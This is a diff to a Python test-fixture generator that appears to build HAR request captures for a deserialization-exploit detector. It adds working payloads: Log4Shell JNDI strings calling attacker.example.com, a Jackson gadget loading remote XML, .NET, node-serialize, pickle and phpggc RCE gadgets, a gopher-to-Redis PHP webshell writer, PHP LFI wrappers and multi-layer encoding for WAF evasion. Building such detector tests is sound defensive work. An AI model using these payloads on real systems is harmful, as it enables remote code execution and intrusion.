@@ -3,6 +3,7 @@ import base64
 import gzip
 import random
 import sys
+import urllib.parse
 
 random.seed(1337)
 
@@ -281,6 +282,128 @@ nodejs_proto = b'{"__proto__":{"isAdmin":true},"padding":"1234567890123456789"}'
 yaml_payload = b"!!python/object/apply:os.system ['id']"
 pickle_payload = b"c__builtin__\neval\np0\n(S'1+1'\np1\ntp2\nRp3\n."
 
+# --- Cac payload "phuc tap" moi, lay nguyen tu tai lieu/nguon cong khai da
+#     search & xac nhan (khong bia), moi cai target 1 nhanh code hien chua
+#     duoc comprehensive.har bao phu ---
+
+# ysoserial CommonsCollections6 - cac ten class THAT su dung trong gadget nay
+# (AnnotationInvocationHandler / InvokerTransformer / ChainedTransformer /
+# PriorityQueue deu la class Java thuc su xuat hien trong output CC6 thuc,
+# tai lieu hoa rong rai trong hau het bai viet ve ysoserial).
+java_cc6_names = (
+    b'\xac\xed\x00\x05sr\x00\x32sun.reflect.annotation.AnnotationInvocationHandler'
+    b'\x00org.apache.commons.collections.functors.InvokerTransformer'
+    b'\x00org.apache.commons.collections.functors.ChainedTransformer'
+    b'\x00org.apache.commons.collections.functors.ConstantTransformer'
+    b'\x00java.util.PriorityQueue'
+)
+
+# Log4Shell / CVE-2021-44228 - dung format JNDI injection thuc, thuong duoc
+# nhung vao header (User-Agent/X-Forwarded-For/Referer la 3 vi tri PoC cong
+# khai hay dung nhat) de kich hoat lookup qua log4j.
+log4shell_jndi = "${jndi:ldap://attacker.example.com/Exploit}"
+# Bien the "obfuscated" that dung trong thuc te de vuot qua cac WAF chi block
+# chuoi "jndi:" tran (${lower:j} ghep lai thanh "j" luc runtime) - duoc nhieu
+# bai viet Log4Shell WAF-bypass trinh bay (Trend Micro, Cybereason, ...).
+log4shell_jndi_waf_bypass = "${${lower:j}ndi:ldap://attacker.example.com/a}"
+
+# CVE-2017-7525 (jackson-databind) - polymorphic deserialization qua thuoc
+# tinh "@class" (Jackson @JsonTypeInfo voi property="@class") tro toi 1 class
+# Spring THAT (ClassPathXmlApplicationContext) duoc nhieu bai viet CVE-2017-7525
+# dung lam class dich de load XML config doc hai tu xa.
+jackson_atclass_gadget = json.dumps({
+    "@class": "org.springframework.context.support.ClassPathXmlApplicationContext",
+    "value": "http://attacker.example.com/exploit-context.xml",
+})
+
+# ysoserial.net ObjectDataProvider + ExpandedWrapper gadget cho Json.Net -
+# cau truc chinh xac theo tai lieu HackTricks "Basic .Net deserialization
+# (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)".
+dotnet_jsonnet_gadget = json.dumps({
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, "
+             "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, "
+                 "Culture=neutral, PublicKeyToken=b77a5c561934e089",
+        "$values": ["cmd", "/c calc"],
+    },
+    "ObjectInstance": {
+        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, "
+                 "Culture=neutral, PublicKeyToken=b77a5c561934e089",
+    },
+})
+
+# .NET Remoting HTTP channel dung SOAP envelope de goi method tu xa - cau
+# truc SOAP-ENV chuan, la nen tang cho nhieu ky thuat exploit .NET Remoting
+# deserialization da duoc trinh bay trong nhieu bai noi/bai viet cong khai.
+dotnet_soap_envelope = (
+    '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
+    'xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" '
+    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
+    '<SOAP-ENV:Body><a1:BinaryFormatter xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System/mscorlib">'
+    '</a1:BinaryFormatter></SOAP-ENV:Body></SOAP-ENV:Envelope>'
+)
+
+# PHP expect:// wrapper - chay lenh he thong truc tiep qua extension expect,
+# ky thuat wrapper RCE thuc, tai lieu hoa tren HackTricks "LFI2RCE via PHP Filters".
+php_expect_wrapper = "expect://id"
+
+# PHP filter chain - ky thuat LFI kinh dien dung php://filter voi
+# convert.base64-encode de doc file bat ky qua include(), khong can wrapper
+# nguy hiem khac (tai lieu hoa rong rai, la nen tang cua cac "PHP filter chain" RCE sau nay).
+php_filter_chain_lfi = "php://filter/convert.base64-encode/resource=/etc/passwd"
+
+# Gopher-to-Redis webshell qua SSRF - ky thuat CONFIG SET dir + dbfilename +
+# SET + SAVE de ghi 1 file PHP webshell qua Redis, duoc Gopherus va nhieu bai
+# viet "SSRF to RCE via Redis using Gopher Protocol" trinh bay.
+redis_gopher_webshell = (
+    "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0a"
+    "CONFIG%20SET%20dbfilename%20shell.php%0d%0a"
+    "SET%20x%20%22%3C%3Fphp%20system(%24_GET%5B%27cmd%27%5D)%3B%3F%3E%22%0d%0a"
+    "SAVE%0d%0a"
+)
+
+# CVE-2017-5941 (node-serialize) - dung nguyen van cau truc IIFE tu PoC cong
+# khai (OpSecX / exploit-db 41289): "_$$ND_FUNC$$_" + function IIFE tu goi luon.
+nodejs_cve_2017_5941 = json.dumps({
+    "rce": "_$$ND_FUNC$$_function (){require('child_process').exec('id', "
+           "function(error, stdout, stderr) { console.log(stdout) });}()"
+})
+
+# Pickle protocol-0 opcode RCE "kinh dien" - GLOBAL os/system + STRING 'id' +
+# REDUCE, tuong duong byte-level cua __reduce__ tra ve (os.system, ("id",)),
+# duoc trich dan rong rai trong cac bai viet ve pickle RCE (PayloadsAllTheThings,
+# dhound.io, davidhamann.de, ...).
+pickle_textbook_os_system = b"cos\nsystem\n(S'id'\ntR."
+
+# phpggc Monolog/RCE1 - dung LAI chinh xac cau truc (ten class, ten property da
+# mangle protected voi \0*\0, gia tri) duoc cong bo trong repo goc
+# ambionics/phpggc (gadgetchains/Monolog/RCE/1/gadgets.php) - khong tu bien.
+php_monolog_rce1 = (
+    'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{'
+    's:9:"\x00*\x00socket";'
+    'O:29:"Monolog\\Handler\\BufferHandler":7:{'
+    's:10:"\x00*\x00handler";r:2;'
+    's:13:"\x00*\x00bufferSize";i:-1;'
+    's:9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}'
+    's:8:"\x00*\x00level";N;'
+    's:14:"\x00*\x00initialized";b:1;'
+    's:14:"\x00*\x00bufferLimit";i:-1;'
+    's:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}'
+    '}}'
+)
+
+# Cac bien PHP field-type khac nhau, cung nam trong PHP_PRIVILEGE_FIELDS /
+# PHP_IDENTITY_FIELDS / PHP_SENSITIVE_FIELDS (ExploitabilityAnalysis.py) nhung
+# tung loai kieu du lieu khac nhau (int/string) hoac tung nhanh khac nhau
+# (identity-only / sensitive-only) - deu la cau truc PHP serialize hop le,
+# chi khac gia tri field so voi payload admin/boolean da co san.
+php_level_integer = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"level";i:1;}'
+php_role_string = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:4:"role";s:4:"user";}'
+php_identity_only = 'O:7:"Account":1:{s:5:"email";s:17:"victim@corp-x.com";}'
+php_sensitive_only = 'O:7:"Payment":1:{s:6:"secret";s:16:"sk_live_51H8xJ2K";}'
+
 malicious_entries = [
     # --- PHP ---
     entry(f"{BASE}/my-account", cookies={"session": b64(php_priv_esc.encode())}),
@@ -350,6 +473,101 @@ malicious_entries = [
     entry(f"{BASE}/api/account/profile-legacy", headers={
         "Authorization": f"Bearer {jwt_with_claim(902, {'sub': php_priv_esc}, alg_none=True)}",
         "Accept": "application/json",
+    }),
+
+    # --- Java: ten class gadget CommonsCollections6 THAT (test JAVA_GADGET_CHAINS
+    #     keyword detection, truoc gio chua co entry nao dung ten gadget cu the) ---
+    entry(f"{BASE}/api/session-cc6", headers={"X-Session-Token": b64(java_cc6_names)}),
+    entry(f"{BASE}/api/session-cc6-gzip", headers={"X-Session-Token": gz_b64(java_cc6_names)}),
+
+    # --- Log4Shell / CVE-2021-44228 JNDI injection nhet vao header (User-Agent la
+    #     1 trong 3 vi tri PoC cong khai hay dung nhat) ---
+    entry(f"{BASE}/", headers={"User-Agent": log4shell_jndi}),
+    entry(f"{BASE}/api/products/1", headers={"Referer": log4shell_jndi}),
+    entry(f"{BASE}/api/products/2", headers={"X-Forwarded-For": log4shell_jndi_waf_bypass}),
+
+    # --- CVE-2017-7525 (jackson-databind) @class polymorphic gadget ---
+    entry(f"{BASE}/api/import-config", method="POST",
+          post_text=jackson_atclass_gadget, post_mime="application/json"),
+
+    # --- ysoserial.net ObjectDataProvider/ExpandedWrapper Json.Net gadget ---
+    entry(f"{BASE}/api/state-json", method="POST",
+          post_text=dotnet_jsonnet_gadget, post_mime="application/json"),
+
+    # --- .NET Remoting SOAP envelope (DOTNET_PATTERNS, chua co entry nao dung
+    #     dang SOAP-ENV) ---
+    entry(f"{BASE}/RemotingService.rem", method="POST",
+          post_text=dotnet_soap_envelope, post_mime="text/xml"),
+
+    # --- PHP expect:// wrapper RCE ---
+    entry(f"{BASE}/download-doc", query={"file": php_expect_wrapper}),
+
+    # --- PHP filter chain LFI (WRAPPER_MODERATE, chua co entry nao dung
+    #     php://filter) ---
+    entry(f"{BASE}/view-template", query={"template": php_filter_chain_lfi}),
+
+    # --- Gopher-to-Redis webshell (bien the phuc tap hon cua gopher:// da co,
+    #     dung dung RESP-style Redis commands thuc thay vi chi "_INFO") ---
+    entry(f"{BASE}/proxy-fetch", query={"target": redis_gopher_webshell}),
+
+    # --- node-serialize CVE-2017-5941, dung nguyen van IIFE tu PoC cong khai ---
+    entry(f"{BASE}/api/update-profile-cve", method="POST",
+          post_text=nodejs_cve_2017_5941, post_mime="application/json"),
+
+    # --- Pickle "textbook" opcode RCE (GLOBAL os/system + REDUCE), khac han
+    #     pickle_payload hien co (dung __builtin__/eval) ---
+    entry(f"{BASE}/api/task-v2", query={"data": b64(pickle_textbook_os_system)}),
+    entry(f"{BASE}/api/task-v2-gzip", query={"data": gz_b64(pickle_textbook_os_system)}),
+
+    # --- phpggc Monolog/RCE1 THAT (cau truc lay tu repo goc ambionics/phpggc,
+    #     co nested object + protected-property mangling \0*\0 + PHP reference
+    #     token r:2; — stress test dung parser PHP thuc trong payloadMutation.py) ---
+    entry(f"{BASE}/my-account-v2", cookies={"session": b64(php_monolog_rce1.encode('latin-1'))}),
+
+    # --- PHP: cac nhanh field-type khac nhau trong ExploitabilityAnalysis
+    #     (integer/string privilege, identity-only, sensitive-only — truoc gio
+    #     chi co entry cho boolean "admin") ---
+    entry(f"{BASE}/my-account-level", cookies={"session": b64(php_level_integer.encode())}),
+    entry(f"{BASE}/my-account-role", cookies={"session": b64(php_role_string.encode())}),
+    entry(f"{BASE}/my-account-email", cookies={"session": b64(php_identity_only.encode())}),
+    entry(f"{BASE}/api/billing", headers={"X-Billing-Token": b64(php_sensitive_only.encode())}),
+
+    # --- 2 gadget DOC LAP nam trong 2 claim KHAC NHAU cua CUNG 1 JWT, khac
+    #     format hoan toan (PHP + Ruby) — test truc tiep thuat toan collapse()
+    #     moi sua trong normalize.py: ca 2 phai song sot, khong cai nao bi
+    #     "sieu tap" boi cai kia vi chung khong lien quan nhau ---
+    entry(f"{BASE}/api/account/multi-tenant", headers={
+        "Authorization": f"Bearer {jwt_with_claim(910, {'php_ctx': php_priv_esc, 'ruby_ctx': b64(ruby_raw_long)})}",
+        "Accept": "application/json",
+    }),
+
+    # --- 2 gadget PHP DOC LAP trong 2 claim khac nhau, moi cai co field
+    #     privilege KHAC nhau (boolean "admin" vs string "role") — dung lai
+    #     dung kich ban da verify thu cong khi fix bug main.py chi dung
+    #     value_normalize[0]: neu ca 2 candidate deu song sot nhung chi
+    #     candidate dau tien duoc mutate thi day la bang chung thuc te ---
+    entry(f"{BASE}/api/account/dual-role", headers={
+        "Authorization": f"Bearer {jwt_with_claim(911, {'primary': php_priv_esc, 'secondary': php_role_string})}",
+        "Accept": "application/json",
+    }),
+
+    # --- Gadget nam sau 3 tang long (object -> array -> object -> string) —
+    #     test _extract_claim_strings() de quy qua ca dict va list nhieu tang ---
+    entry(f"{BASE}/api/account/nested-claim", headers={
+        "Authorization": f"Bearer {jwt_with_claim(912, {'profile': {'sessions': [{'legacy': php_priv_esc}, 'noise-value']}})}",
+        "Accept": "application/json",
+    }),
+
+    # --- Chuoi encode 3 tang: base64(base64(payload)) — double-base64, stress
+    #     test collapse() voi 1 chuoi cha-con dai hon (3 node lien tiep thay vi 2) ---
+    entry(f"{BASE}/api/legacy-session", cookies={"session": b64(b64(php_priv_esc.encode()).encode())}),
+
+    # --- Chuoi encode 4 tang: urlencode(base64(gzip(base64(payload)))) — ky
+    #     thuat "multiple encoding" duoc OWASP Testing Guide xep vao nhom
+    #     "Testing for evasion techniques" (WAF bypass qua nhieu lop encode
+    #     long nhau); dong thoi test gioi han max_depth/max_candidate cua BFS ---
+    entry(f"{BASE}/api/deep-session", query={
+        "token": urllib.parse.quote(gz_b64(b64(php_priv_esc.encode()).encode()), safe=""),
     }),
 ]
 
